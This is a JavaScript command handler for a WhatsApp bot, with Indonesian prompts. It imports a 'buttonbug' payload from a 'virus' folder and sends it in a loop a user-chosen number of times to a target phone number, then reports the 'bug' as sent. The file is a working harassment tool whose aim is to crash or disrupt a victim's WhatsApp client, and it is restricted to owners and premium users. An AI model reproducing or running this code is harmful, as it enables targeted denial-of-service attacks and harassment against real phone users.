import { buttonbug } from "../virus/buttonbug.js";

let handler = async (m, { conn, text, usedPrefix, command, isOwner }) => {
    if (!text) throw `uhm... siapa yg mau diserang?\n contoh penggunaan:\n *${usedPrefix + command}* nomor\n Example: *${usedPrefix + command}* 6281234567890`;
    let [orang, jumlah] = text.split(',')
    if (!jumlah) throw 'masukan jumlah nya.\n\nContoh\n.sbug 62882...., 10'
    m.reply('_sedang diproses..._')
        //for (let i = jumlah; i > 1; i--) {
        for (let i = 0; i < jumlah; i++) {
        conn.sendMessage(orang + '@s.whatsapp.net', { text: buttonbug }, { quoted: m })
        }
        conn.reply(m.chat, `sukses mengirim bug ke ${orang}`, m)
}
handler.help = ['sendbug', 'sbug'].map(v => v + ' <nomor>')
handler.tags = ['premium', 'virus']
handler.command = /^(buttonbug)$/i

handler.premium = true
handler.owner = true 

export default handler